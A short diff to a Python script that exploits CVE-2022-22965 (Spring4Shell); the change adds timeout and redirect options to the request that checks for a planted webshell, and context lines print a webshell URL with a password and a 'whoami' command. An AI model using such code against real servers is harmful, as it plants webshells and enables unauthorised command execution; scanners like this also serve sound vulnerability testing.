@@ -41,7 +41,7 @@ def CVE_2022_22965(url, proxies):
         sleep(0.5)
         requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
-        test = requests.get(url + "tomcatwar.jsp", verify=False, proxies=proxies)
+        test = requests.get(url + "tomcatwar.jsp", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         if (test.status_code == 200):
             cprint("[+] [CVE-2022-22965] Webshell为：" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami" ,"red")
             f2 = open("vulout.txt", "a")
